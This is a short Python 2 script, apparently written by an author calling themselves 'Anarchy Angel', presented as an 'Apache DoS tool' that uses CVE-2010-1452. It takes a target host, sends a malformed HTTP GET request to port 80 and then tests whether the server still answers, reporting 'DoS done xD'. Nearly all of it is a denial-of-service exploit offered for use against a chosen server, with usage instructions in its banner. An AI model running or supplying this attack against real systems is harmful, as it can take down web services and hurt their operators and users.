#!/usr/bin/python
import socket, getopt, sys
try:
 opts, args = getopt.getopt(sys.argv[1:], "ht:")
except getopt.GetoptError, err:
 print str(err)
 exit()
def banner():
 print "************************************************"
 print "**|''''''''''''''''''''''''''''''''''''''''''|**"
 print "**|Apache DoS tool                           |**"
 print "**|By: Anarchy Angel                         |**"
 print "**|Email: anarchy.ang31 [@] gmail            |**"
 print "**|http://hha.zapto.org                      |**"
 print "**|-                                         |**"
 print "**|Usage:                                    |**"
 print "**| $ python apacheDoS-CVE20101452.py -h     |**"
 print "**|                                          |**"
 print "**|,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,|**"
 print "************************************************"
 print ""
for o, a in opts:
 if o in ("-h", "--help"):
  banner()
  print "-h: This message."
  print "-t <target>: The target server you want to DoS"
  print "i.e. user@user:~/$ python apacheDoS-CVE20101452.py -t www.target.com"
  print "This script uses the CVE-2010-1452 bug to DoS apache servers."
  print "More info: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1452"
  exit()
 elif o in ("-t", "--target"):
  server = a
 else:
  assert False, "unhandled option"
try:
 server
except NameError:
 print "No mode set."
 print "Try -h"
 exit()
banner()
print "Starting DoS attack"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#now connect to the web server on port 80 
# - the normal http port
s.connect((server, 80))
s.send("GET http://"+server+" HTTP/1.0")
print "Packets sent\nChecking servers status....."
s.close()
f = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
 f.connect((server, 80))
 print "Server not open to DoS :("
 f.close()
except:
 print "DoS done xD"

